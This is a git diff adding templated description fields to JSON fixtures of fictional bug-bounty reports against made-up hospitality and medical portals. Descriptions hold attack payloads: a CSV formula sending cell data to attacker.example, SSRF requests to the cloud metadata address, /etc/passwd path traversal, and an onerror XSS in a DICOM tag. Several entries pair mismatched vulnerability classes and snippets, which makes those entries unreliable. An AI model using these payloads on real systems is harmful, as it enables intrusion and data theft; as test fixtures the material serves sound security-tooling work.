+      "description": "CSV export writes unescaped values; cells starting with =,+,-,@ are treated as formulas by spreadsheet apps, enabling exfiltration when opened.\n\n### Technical analysis\n- Vulnerability class: **CSV Formula Injection**\n- Affected target: `https://portal.alpenblick-hospitality.foo/export`\n- Preconditions: authenticated user: citizen; app version: Console 2025.09\n\n```csv\n=HYPERLINK(\"https://attacker.example/?c=\"&ENCODEURL(A1))\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Create a record with a field value beginning with a formula string.\n- Export CSV and open in Excel/LibreOffice; observe formula execution.\n\n### Recommendations\n- Prefix cells starting with `=,+,-,@` with a single quote.\n- Export CSV as text-safe or use TSV.\n"
     },
     "triager": {
       "status": "accepted",
@@ -13226,7 +13324,8 @@
           "offset": "3d 4h",
           "message": "Verified fix in Firefox and Safari; Chrome previously tested."
         }
-      ]
+      ],
+      "description": "A server-side fetch accepts attacker-controlled URLs without allowlist or private range blocking, enabling access to internal metadata/services.\n\n### Technical analysis\n- Vulnerability class: **Server-Side Request Forgery (SSRF)**\n- Affected target: `https://api.alpenblick-hospitality.foo/fetch`\n- Preconditions: authenticated user: radiologist; app version: API v2\n\n```bash\n# Demonstrative SSRF curl\ncurl -s 'https://api.example/foo?url=http://169.254.169.254/latest/meta-data/hostname'\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- POST url=http://169.254.169.254/latest/meta-data/ to the import endpoint.\n- Observe internal metadata persisted in the created resource.\n\n### Recommendations\n- Enforce URL allowlists; block private and metadata ranges.\n- Resolve DNS server-side; use egress allowlists.\n- Use protocol allowlists (http/https only), size/timeouts.\n"
     },
     "triager": {
       "status": "accepted",
@@ -13336,7 +13435,8 @@
           "offset": "4d 7h",
           "message": "Included additional payload variant covering alternate render path."
         }
-      ]
+      ],
+      "description": "The download endpoint authorizes by session only and does not verify ownership, allowing enumeration of other users' resources.\n\n### Technical analysis\n- Vulnerability class: **Insecure Direct Object Reference (IDOR)**\n- Affected target: `https://portal.alpenblick-hospitality.foo/api/documents/`\n- Preconditions: authenticated user: unauthenticated; app version: Mobile 2025.09\n\n```http\nGET /api/files/12345 HTTP/1.1\nHost: victim.example\nCookie: session=...\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Request your own resource by ID.\n- Increment/decrement ID and observe cross-account access.\n\n### Recommendations\n- Authorize by object ownership on every read/write.\n- Use opaque identifiers; avoid incremental IDs.\n"
     },
     "triager": {
       "status": "accepted",
@@ -13464,7 +13564,8 @@
           "offset": "0h",
           "message": "Initial report filed with screenshots and logs."
         }
-      ]
+      ],
+      "description": "The login flow accepts external URLs in the returnUrl parameter, enabling phishing chains and potential token leakage.\n\n### Technical analysis\n- Vulnerability class: **Open Redirect**\n- Affected target: `https://api.alpenblick-hospitality.foo/auth/callback?next=https://evil.foo`\n- Preconditions: authenticated user: citizen; app version: Console 2025.09\n\n```http\nGET /login?returnUrl=https://attacker.example/collect HTTP/1.1\nHost: victim.example\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Open login with external returnUrl.\n- After authentication, observe 302 to attacker domain.\n\n### Recommendations\n- Validate `returnUrl` against a strict same-origin allowlist.\n- Use state/nonce; avoid reflecting external URLs.\n"
     },
     "triager": {
       "status": "accepted",
@@ -13604,7 +13705,8 @@
           "offset": "4d 16h",
           "message": "Shared minimal HTML page to demonstrate issue reliably."
         }
-      ]
+      ],
+      "description": "A server-side fetch accepts attacker-controlled URLs without allowlist or private range blocking, enabling access to internal metadata/services.\n\n### Technical analysis\n- Vulnerability class: **Server-Side Request Forgery (SSRF)**\n- Affected target: `https://api.alpenblick-hospitality.foo/api/import`\n- Preconditions: authenticated user: admin; app version: Service 1.8\n\n```bash\n# Demonstrative SSRF curl\ncurl -s 'https://api.example/foo?url=http://169.254.169.254/latest/meta-data/hostname'\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- POST url=http://169.254.169.254/latest/meta-data/ to the import endpoint.\n- Observe internal metadata persisted in the created resource.\n\n### Recommendations\n- Enforce URL allowlists; block private and metadata ranges.\n- Resolve DNS server-side; use egress allowlists.\n- Use protocol allowlists (http/https only), size/timeouts.\n"
     },
     "triager": {
       "status": "accepted",
@@ -13748,7 +13850,8 @@
           "offset": "7d 17h",
           "message": "Shared curl one-liner to help reproduce quickly."
         }
-      ]
+      ],
+      "description": "The download endpoint authorizes by session only and does not verify ownership, allowing enumeration of other users' resources.\n\n### Technical analysis\n- Vulnerability class: **Insecure Direct Object Reference (IDOR)**\n- Affected target: `https://api.alpenblick-hospitality.foo/api/documents/`\n- Preconditions: authenticated user: unauthenticated; app version: Service 1.8\n\n```http\nGET /api/files/12345 HTTP/1.1\nHost: victim.example\nCookie: session=...\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Request your own resource by ID.\n- Increment/decrement ID and observe cross-account access.\n\n### Recommendations\n- Authorize by object ownership on every read/write.\n- Use opaque identifiers; avoid incremental IDs.\n"
     },
     "triager": {
       "status": "accepted",
@@ -13875,7 +13978,8 @@
           "offset": "1d 21h",
           "message": "Verified fix in Firefox and Safari; Chrome previously tested."
         }
-      ]
+      ],
+      "description": "The API returns Access-Control-Allow-Origin: * with Access-Control-Allow-Credentials: true, allowing any origin to read responses with cookies.\n\n### Technical analysis\n- Vulnerability class: **Misconfigured CORS**\n- Affected target: `https://api.alpenblick-hospitality.foo/profile`\n- Preconditions: authenticated user: citizen; app version: Mobile 2025.09\n\n```http\nHTTP/1.1 200 OK\nAccess-Control-Allow-Origin: *\nAccess-Control-Allow-Credentials: true\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Host malicious page and fetch protected endpoint with credentials.\n- Observe successful JSON read in attacker origin.\n\n### Recommendations\n- Do not combine `Access-Control-Allow-Origin: *` with credentials.\n- Reflect only allowlisted origins; disable credentials unless necessary.\n"
     },
     "triager": {
       "status": "accepted",
@@ -13994,7 +14098,8 @@
           "offset": "4d 12h",
           "message": "Verified fix in Firefox and Safari; Chrome previously tested."
         }
-      ]
+      ],
+      "description": "The download endpoint authorizes by session only and does not verify ownership, allowing enumeration of other users' resources.\n\n### Technical analysis\n- Vulnerability class: **Insecure Direct Object Reference (IDOR)**\n- Affected target: `https://api.alpenblick-hospitality.foo/statements/`\n- Preconditions: authenticated user: unauthenticated; app version: Service 1.8\n\n```http\nGET /api/files/12345 HTTP/1.1\nHost: victim.example\nCookie: session=...\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Request your own resource by ID.\n- Increment/decrement ID and observe cross-account access.\n\n### Recommendations\n- Authorize by object ownership on every read/write.\n- Use opaque identifiers; avoid incremental IDs.\n"
     },
     "triager": {
       "status": "accepted",
@@ -14161,7 +14266,8 @@
           "offset": "7d 1h",
           "message": "Provided HAR with response headers and CSP for reference."
         }
-      ]
+      ],
+      "description": "User-provided content is persisted and rendered via an unsafe primitive in an admin-facing view, leading to JavaScript execution in a privileged context.\n\n### Technical analysis\n- Vulnerability class: **Security Misconfiguration**\n- Affected target: `https://portal.alpenblick-hospitality.foo/console/queue`\n- Preconditions: authenticated user: admin; app version: Service 1.8\n\n```bash\n# Example probe\ncurl -i https://victim.example/endpoint\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Create object with payload in a display field (e.g., subject/memo).\n- Open the admin list/detail view and observe execution.\n\n### Recommendations\n- Validate and sanitize all user-controlled inputs.\n- Enforce allowlists and strict server-side validation.\n- Apply least-privilege and defense-in-depth (CSP, output encoding, parameterized APIs).\n"
     },
     "triager": {
       "status": "accepted",
@@ -14312,7 +14418,8 @@
           "offset": "5d 4h",
           "message": "Included additional payload variant covering alternate render path."
         }
-      ]
+      ],
+      "description": "A filename parameter is concatenated into a path without proper normalization, allowing traversal to system files.\n\n### Technical analysis\n- Vulnerability class: **Path Traversal**\n- Affected target: `https://portal.alpenblick-hospitality.foo/logs?file=../../../../etc/passwd`\n- Preconditions: authenticated user: admin; app version: Service 1.8\n\n```bash\n# Accessing /etc/passwd via traversal\ncurl 'https://example/download?file=../../../../etc/passwd'\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Request with file parameter using ../ traversal to system file.\n- Observe returned file content.\n\n### Recommendations\n- Normalize paths; reject `..` and absolute paths.\n- Enforce rooted directories and access checks by owner.\n- Use safe file APIs; avoid string concatenation.\n"
     },
     "triager": {
       "status": "accepted",
diff --git a/fixtures/reports/alpenlicht_medical_reports.json b/fixtures/reports/alpenlicht_medical_reports.json
index 0f84bcf..b65bba1 100644
--- a/fixtures/reports/alpenlicht_medical_reports.json
+++ b/fixtures/reports/alpenlicht_medical_reports.json
@@ -102,7 +102,8 @@
           "offset": "9d 20h",
           "message": "Verified fix in Firefox and Safari; Chrome previously tested."
         }
-      ]
+      ],
+      "description": "Reverse engineering the Android updater reveals a hardcoded API key used to authorize firmware downloads, allowing unauthorized retrieval of signed update packages.\n\n### Technical analysis\n- Vulnerability class: **Security Misconfiguration**\n- Affected target: `https://updates.alpenlichtmed.foo/api/v1/firmware`\n- Preconditions: authenticated user: unauthenticated; app version: Updater Android 3.2.1\n\n```bash\n# Example probe\ncurl -i https://victim.example/endpoint\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Decompile APK and locate ApiClient.java.\n- Extract constant API_KEY and call firmware endpoint.\n- Receive 200 with firmware package for device family.\n\n### Recommendations\n- Validate and sanitize all user-controlled inputs.\n- Enforce allowlists and strict server-side validation.\n- Apply least-privilege and defense-in-depth (CSP, output encoding, parameterized APIs).\n"
     },
     "triager": {
       "status": "accepted",
@@ -285,7 +286,8 @@
           "offset": "4d 13h",
           "message": "Shared curl one-liner to help reproduce quickly."
         }
-      ]
+      ],
+      "description": "DICOM tags rendered in the web PACS viewer are injected into innerHTML without encoding. Malicious tag values cause script execution when radiologist opens study.\n\n### Technical analysis\n- Vulnerability class: **Stored/Reflected XSS**\n- Affected target: `https://cloud.alpenlichtmed.foo/viewer`\n- Preconditions: authenticated user: radiologist; app version: Viewer 5.4.0\n\n```javascript\n// Sanitize and HTML-encode untrusted data before DOM insertion\nconst unsafe = req.body.subject;\n// BAD\ndocument.querySelector('#subject').innerHTML = unsafe;\n// GOOD\ndocument.querySelector('#subject').textContent = unsafe;\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Upload DICOM with (0008,103E) SeriesDescription containing <img src=x onerror=alert(1)>\n- Open study list; payload executes in viewer.\n- Open study detail; payload executes again in header.\n\n### Recommendations\n- HTML-encode untrusted data before DOM insertion.\n- Prefer `textContent`/safe templating.\n- Deploy strict CSP; strip dangerous tags/attributes.\n"
     },
     "triager": {
       "status": "accepted",
@@ -428,7 +430,8 @@
           "offset": "1d",
           "message": "Retested: client_credentials disabled for public-app; server returns 401 as expected."
         }
-      ]
+      ],
+      "description": "The OAuth server allows a public client to use client_credentials grant, issuing service tokens without client authentication.\n\n### Technical analysis\n- Vulnerability class: **Misconfigured CORS**\n- Affected target: `https://auth.alpenlichtmed.foo/oauth/token`\n- Preconditions: authenticated user: unauthenticated; app version: Auth 2.1\n\n```http\nHTTP/1.1 200 OK\nAccess-Control-Allow-Origin: *\nAccess-Control-Allow-Credentials: true\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- POST grant_type=client_credentials with public client_id and no secret.\n- Receive access_token with scope=devices:read.\n\n### Recommendations\n- Do not combine `Access-Control-Allow-Origin: *` with credentials.\n- Reflect only allowlisted origins; disable credentials unless necessary.\n"
     },
     "triager": {
       "status": "accepted",
@@ -613,7 +616,8 @@
           "offset": "4d 15h",
           "message": "Re-tested on staging after patch; please confirm rollout window."
         }
-      ]
+      ],
+      "description": "The support endpoint accepts a filename parameter without sanitization, allowing traversal to read /etc/passwd.\n\n### Technical analysis\n- Vulnerability class: **Path Traversal**\n- Affected target: `https://api.alpenlichtmed.foo/support/logs?file=../../../../etc/passwd`\n- Preconditions: authenticated user: authenticated support user; app version: Support 1.2\n\n```bash\n# Accessing /etc/passwd via traversal\ncurl 'https://example/download?file=../../../../etc/passwd'\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Login as support user.\n- Request logs with file=../../../../etc/passwd.\n- Server returns system file contents.\n\n### Recommendations\n- Normalize paths; reject `..` and absolute paths.\n- Enforce rooted directories and access checks by owner.\n- Use safe file APIs; avoid string concatenation.\n"
     },
     "triager": {
       "status": "accepted",
@@ -756,7 +760,8 @@
           "offset": "1d",
           "message": "After fix: /docs requires SSO; public doc trimmed. Confirmed 403 when unauthenticated."
         }
-      ]
+      ],
+      "description": "The /docs route exposes an internal OpenAPI document including admin-only endpoints and parameter examples.\n\n### Technical analysis\n- Vulnerability class: **Security Misconfiguration**\n- Affected target: `https://api.alpenlichtmed.foo/docs`\n- Preconditions: authenticated user: unauthenticated; app version: API 2.3\n\n```bash\n# Example probe\ncurl -i https://victim.example/endpoint\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Navigate to /docs; JSON served without auth.\n- Find /admin/* endpoints detailed.\n\n### Recommendations\n- Validate and sanitize all user-controlled inputs.\n- Enforce allowlists and strict server-side validation.\n- Apply least-privilege and defense-in-depth (CSP, output encoding, parameterized APIs).\n"
     },
     "triager": {
       "status": "accepted",
@@ -927,7 +932,8 @@
           "offset": "7d",
           "message": "Verified fix in Firefox and Safari; Chrome previously tested."
         }
-      ]
+      ],
+      "description": "The s3://alpenlichtmed-backups bucket permits ListObjects to unauthenticated users via public ACLs revealing backup structure (no PHI included in PoC).\n\n### Technical analysis\n- Vulnerability class: **Security Misconfiguration**\n- Affected target: `https://cloud.alpenlichtmed.foo`\n- Preconditions: authenticated user: unauthenticated; app version: N/A\n\n```bash\n# Example probe\ncurl -i https://victim.example/endpoint\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- aws s3 ls s3://alpenlichtmed-backups/ -> 200 listing.\n- Subdirectories visible: configs/, manifests/\n\n### Recommendations\n- Validate and sanitize all user-controlled inputs.\n- Enforce allowlists and strict server-side validation.\n- Apply least-privilege and defense-in-depth (CSP, output encoding, parameterized APIs).\n"
     },
     "triager": {
       "status": "accepted",
@@ -1058,7 +1064,8 @@
           "offset": "1d",
           "message": "Retested after fix: header echoes trusted origin; wildcard removed. Credentials only for allowlisted origins."
         }
-      ]
+      ],
+      "description": "The API sets Access-Control-Allow-Origin: * together with Access-Control-Allow-Credentials: true, enabling any site to read responses with cookies attached.\n\n### Technical analysis\n- Vulnerability class: **Misconfigured CORS**\n- Affected target: `https://api.alpenlichtmed.foo`\n- Preconditions: authenticated user: victim user; app version: API 2.3\n\n```http\nHTTP/1.1 200 OK\nAccess-Control-Allow-Origin: *\nAccess-Control-Allow-Credentials: true\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Host malicious page and perform fetch with credentials.\n- Observe successful read of protected endpoint.\n\n### Recommendations\n- Do not combine `Access-Control-Allow-Origin: *` with credentials.\n- Reflect only allowlisted origins; disable credentials unless necessary.\n"
     },
     "triager": {
       "status": "accepted",
@@ -1273,7 +1280,8 @@
           "offset": "11d 17h",
           "message": "Uploaded redacted logs illustrating server-side trace."
         }
-      ]
+      ],
+      "description": "The import endpoint fetches DICOM studies from provided URLs without proper validation, allowing SSRF to internal systems.\n\n### Technical analysis\n- Vulnerability class: **Server-Side Request Forgery (SSRF)**\n- Affected target: `https://cloud.alpenlichtmed.foo/api/import`\n- Preconditions: authenticated user: authenticated user; app version: PACS Import 2.0\n\n```bash\n# Demonstrative SSRF curl\ncurl -s 'https://api.example/foo?url=http://169.254.169.254/latest/meta-data/hostname'\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- POST {url: 'http://169.254.169.254/latest/meta-data/'}\n- Service fetches and stores response in a study.\n\n### Recommendations\n- Enforce URL allowlists; block private and metadata ranges.\n- Resolve DNS server-side; use egress allowlists.\n- Use protocol allowlists (http/https only), size/timeouts.\n"
     },
     "triager": {
       "status": "accepted",
@@ -1436,7 +1444,8 @@
           "offset": "4d 10h",
           "message": "Re-tested on staging after patch; please confirm rollout window."
         }
-      ]
+      ],
+      "description": "The export feature writes unescaped values; a cell starting with = is interpreted as a formula, enabling exfiltration when opened in Excel/LibreOffice.\n\n### Technical analysis\n- Vulnerability class: **CSV Formula Injection**\n- Affected target: `https://cloud.alpenlichtmed.foo/export`\n- Preconditions: authenticated user: radiology admin; app version: PACS 5.4.1\n\n```csv\n=HYPERLINK(\"https://attacker.example/?c=\"&ENCODEURL(A1))\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Create patient with name '=HYPERLINK(\"https://evil.foo\",\"click\")'\n- Export CSV and open in Excel; link auto-executes.\n\n### Recommendations\n- Prefix cells starting with `=,+,-,@` with a single quote.\n- Export CSV as text-safe or use TSV.\n"
     },
     "triager": {
       "status": "accepted",
@@ -1611,7 +1620,8 @@
           "offset": "7d 17h",
           "message": "Added sanitized PoC variant to avoid external calls."
         }
-      ]
+      ],
+      "description": "Metrics endpoint is publicly accessible and includes labels with patient IDs, which counts as PHI metadata exposure.\n\n### Technical analysis\n- Vulnerability class: **Server-Side Request Forgery (SSRF)**\n- Affected target: `https://api.alpenlichtmed.foo/metrics`\n- Preconditions: authenticated user: unauthenticated; app version: API 2.3\n\n```bash\n# Demonstrative SSRF curl\ncurl -s 'https://api.example/foo?url=http://169.254.169.254/latest/meta-data/hostname'\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- GET /metrics -> 200 text/plain\n- Observe lines like pacs_patient_count{patient_id='P1234'} 1\n\n### Recommendations\n- Enforce URL allowlists; block private and metadata ranges.\n- Resolve DNS server-side; use egress allowlists.\n- Use protocol allowlists (http/https only), size/timeouts.\n"
     },
     "triager": {
       "status": "accepted",
@@ -1762,7 +1772,8 @@
           "offset": "5d 16h",
           "message": "Confirmed behavior on latest build; attaching version string."
         }
-      ]
+      ],
+      "description": "A filename parameter is concatenated into a path without proper normalization, allowing traversal to system files.\n\n### Technical analysis\n- Vulnerability class: **Path Traversal**\n- Affected target: `https://updates.alpenlichtmed.foo/support/logs?file=../../../../etc/passwd`\n- Preconditions: authenticated user: unauthenticated; app version: Mobile 2025.09\n\n```bash\n# Accessing /etc/passwd via traversal\ncurl 'https://example/download?file=../../../../etc/passwd'\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Request with file parameter using ../ traversal to system file.\n- Observe returned file content.\n\n### Recommendations\n- Normalize paths; reject `..` and absolute paths.\n- Enforce rooted directories and access checks by owner.\n- Use safe file APIs; avoid string concatenation.\n"
     },
     "triager": {
       "status": "accepted",
@@ -1885,7 +1896,8 @@
           "offset": "5d 9h",
           "message": "Shared curl one-liner to help reproduce quickly."
         }
-      ]
+      ],
+      "description": "A server-side fetch accepts attacker-controlled URLs without allowlist or private range blocking, enabling access to internal metadata/services.\n\n### Technical analysis\n- Vulnerability class: **Server-Side Request Forgery (SSRF)**\n- Affected target: `https://updates.alpenlichtmed.foo/fetch`\n- Preconditions: authenticated user: citizen; app version: API 2.3\n\n```bash\n# Demonstrative SSRF curl\ncurl -s 'https://api.example/foo?url=http://169.254.169.254/latest/meta-data/hostname'\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- POST url=http://169.254.169.254/latest/meta-data/ to the import endpoint.\n- Observe internal metadata persisted in the created resource.\n\n### Recommendations\n- Enforce URL allowlists; block private and metadata ranges.\n- Resolve DNS server-side; use egress allowlists.\n- Use protocol allowlists (http/https only), size/timeouts.\n"
     },
     "triager": {
       "status": "accepted",
@@ -2017,7 +2029,8 @@
           "offset": "4d 3h",
           "message": "Uploaded redacted logs illustrating server-side trace."
         }
-      ]
+      ],
+      "description": "CSV export writes unescaped values; cells starting with =,+,-,@ are treated as formulas by spreadsheet apps, enabling exfiltration when opened.\n\n### Technical analysis\n- Vulnerability class: **CSV Formula Injection**\n- Affected target: `https://updates.alpenlichtmed.foo/export`\n- Preconditions: authenticated user: citizen; app version: Service 1.8\n\n```csv\n=HYPERLINK(\"https://attacker.example/?c=\"&ENCODEURL(A1))\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Create a record with a field value beginning with a formula string.\n- Export CSV and open in Excel/LibreOffice; observe formula execution.\n\n### Recommendations\n- Prefix cells starting with `=,+,-,@` with a single quote.\n- Export CSV as text-safe or use TSV.\n"
     },
     "triager": {
       "status": "accepted",
@@ -2172,7 +2185,8 @@
           "offset": "2d 20h",
           "message": "Included additional payload variant covering alternate render path."
         }
-      ]
+      ],
+      "description": "A filename parameter is concatenated into a path without proper normalization, allowing traversal to system files.\n\n### Technical analysis\n- Vulnerability class: **Path Traversal**\n- Affected target: `https://cloud.alpenlichtmed.foo/logs?file=../../../../etc/passwd`\n- Preconditions: authenticated user: radiologist; app version: Console 2025.09\n\n```bash\n# Accessing /etc/passwd via traversal\ncurl 'https://example/download?file=../../../../etc/passwd'\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Request with file parameter using ../ traversal to system file.\n- Observe returned file content.\n\n### Recommendations\n- Normalize paths; reject `..` and absolute paths.\n- Enforce rooted directories and access checks by owner.\n- Use safe file APIs; avoid string concatenation.\n"
     },
     "triager": {
       "status": "accepted",
@@ -2304,7 +2318,8 @@
           "offset": "3d 9h",
           "message": "Shared minimal HTML page to demonstrate issue reliably."
         }
-      ]
+      ],
+      "description": "The API returns Access-Control-Allow-Origin: * with Access-Control-Allow-Credentials: true, allowing any origin to read responses with cookies.\n\n### Technical analysis\n- Vulnerability class: **Misconfigured CORS**\n- Affected target: `https://cloud.alpenlichtmed.foo/api/me`\n- Preconditions: authenticated user: unauthenticated; app version: Service 1.8\n\n```http\nHTTP/1.1 200 OK\nAccess-Control-Allow-Origin: *\nAccess-Control-Allow-Credentials: true\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Host malicious page and fetch protected endpoint with credentials.\n- Observe successful JSON read in attacker origin.\n\n### Recommendations\n- Do not combine `Access-Control-Allow-Origin: *` with credentials.\n- Reflect only allowlisted origins; disable credentials unless necessary.\n"
     },
     "triager": {
       "status": "accepted",
@@ -2450,7 +2465,8 @@
           "offset": "4d 8h",
           "message": "Confirmed behavior on latest build; attaching version string."
         }
-      ]
+      ],
+      "description": "The /metrics endpoint is publicly accessible and includes identifiers in labels, exposing sensitive metadata.\n\n### Technical analysis\n- Vulnerability class: **Server-Side Request Forgery (SSRF)**\n- Affected target: `https://cloud.alpenlichtmed.foo/metrics`\n- Preconditions: authenticated user: support agent; app version: Auth 2025.09\n\n```bash\n# Demonstrative SSRF curl\ncurl -s 'https://api.example/foo?url=http://169.254.169.254/latest/meta-data/hostname'\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- GET /metrics and observe labels with identifiers.\n\n### Recommendations\n- Enforce URL allowlists; block private and metadata ranges.\n- Resolve DNS server-side; use egress allowlists.\n- Use protocol allowlists (http/https only), size/timeouts.\n"
     },
     "triager": {
       "status": "accepted",
@@ -2558,7 +2574,8 @@
           "offset": "0h",
           "message": "Initial submission with PoC and reproduction steps."
         }
-      ]
+      ],
+      "description": "A server-side fetch accepts attacker-controlled URLs without allowlist or private range blocking, enabling access to internal metadata/services.\n\n### Technical analysis\n- Vulnerability class: **Server-Side Request Forgery (SSRF)**\n- Affected target: `https://updates.alpenlichtmed.foo/fetch`\n- Preconditions: authenticated user: admin; app version: API v2\n\n```bash\n# Demonstrative SSRF curl\ncurl -s 'https://api.example/foo?url=http://169.254.169.254/latest/meta-data/hostname'\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- POST url=http://169.254.169.254/latest/meta-data/ to the import endpoint.\n- Observe internal metadata persisted in the created resource.\n\n### Recommendations\n- Enforce URL allowlists; block private and metadata ranges.\n- Resolve DNS server-side; use egress allowlists.\n- Use protocol allowlists (http/https only), size/timeouts.\n"
     },
     "triager": {
       "status": "accepted",
@@ -2714,7 +2731,8 @@
           "offset": "3d 11h",
           "message": "Shared minimal HTML page to demonstrate issue reliably."
         }
-      ]
+      ],
+      "description": "A server-side fetch accepts attacker-controlled URLs without allowlist or private range blocking, enabling access to internal metadata/services.\n\n### Technical analysis\n- Vulnerability class: **Server-Side Request Forgery (SSRF)**\n- Affected target: `https://updates.alpenlichtmed.foo/fetch`\n- Preconditions: authenticated user: admin; app version: Portal 2025.09\n\n```bash\n# Demonstrative SSRF curl\ncurl -s 'https://api.example/foo?url=http://169.254.169.254/latest/meta-data/hostname'\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- POST url=http://169.254.169.254/latest/meta-data/ to the import endpoint.\n- Observe internal metadata persisted in the created resource.\n\n### Recommendations\n- Enforce URL allowlists; block private and metadata ranges.\n- Resolve DNS server-side; use egress allowlists.\n- Use protocol allowlists (http/https only), size/timeouts.\n"
     },
     "triager": {
       "status": "accepted",
@@ -2866,7 +2884,8 @@
           "offset": "1d 20h",
           "message": "Re-tested on staging after patch; please confirm rollout window."
         }
-      ]
+      ],
+      "description": "User-provided content is persisted and rendered via an unsafe primitive in an admin-facing view, leading to JavaScript execution in a privileged context.\n\n### Technical analysis\n- Vulnerability class: **Security Misconfiguration**\n- Affected target: `https://updates.alpenlichtmed.foo/console/queue`\n- Preconditions: authenticated user: admin; app version: Auth 2025.09\n\n```bash\n# Example probe\ncurl -i https://victim.example/endpoint\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Create object with payload in a display field (e.g., subject/memo).\n- Open the admin list/detail view and observe execution.\n\n### Recommendations\n- Validate and sanitize all user-controlled inputs.\n- Enforce allowlists and strict server-side validation.\n- Apply least-privilege and defense-in-depth (CSP, output encoding, parameterized APIs).\n"
     },
     "triager": {
       "status": "accepted",
@@ -3014,7 +3033,8 @@
           "offset": "3d 8h",
           "message": "Verified fix in Firefox and Safari; Chrome previously tested."
         }
-      ]
+      ],
+      "description": "The download endpoint authorizes by session only and does not verify ownership, allowing enumeration of other users' resources.\n\n### Technical analysis\n- Vulnerability class: **Insecure Direct Object Reference (IDOR)**\n- Affected target: `https://api.alpenlichtmed.foo/statements/`\n- Preconditions: authenticated user: admin; app version: Portal 2025.09\n\n```http\nGET /api/files/12345 HTTP/1.1\nHost: victim.example\nCookie: session=...\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Request your own resource by ID.\n- Increment/decrement ID and observe cross-account access.\n\n### Recommendations\n- Authorize by object ownership on every read/write.\n- Use opaque identifiers; avoid incremental IDs.\n"
     },
     "triager": {
       "status": "accepted",
@@ -3145,7 +3165,8 @@
           "offset": "1d 8h",
           "message": "Added sanitized PoC variant to avoid external calls."
         }
-      ]
+      ],
